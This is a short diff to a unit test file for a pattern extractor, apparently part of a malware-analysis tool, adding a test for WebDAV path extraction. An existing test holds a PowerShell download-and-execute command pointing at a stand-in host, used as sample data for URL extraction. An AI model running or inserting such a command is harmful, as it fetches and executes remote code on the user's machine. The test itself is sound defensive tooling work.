@@ -200,3 +200,7 @@ class TestPatternExtractor(TestUnitBase):
         data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.example.com/boom');".encode('utf-16le')
         url = str(data | self.load('url'))
         self.assertEqual(url, 'http://www.example.com/boom')
+
+    def test_webDAV_paths(self):
+        data = B"\\\\1.1.1.1@556\\the\\finest\\binaires"
+        self.assertEqual(data, data | self.load('path') | bytes)
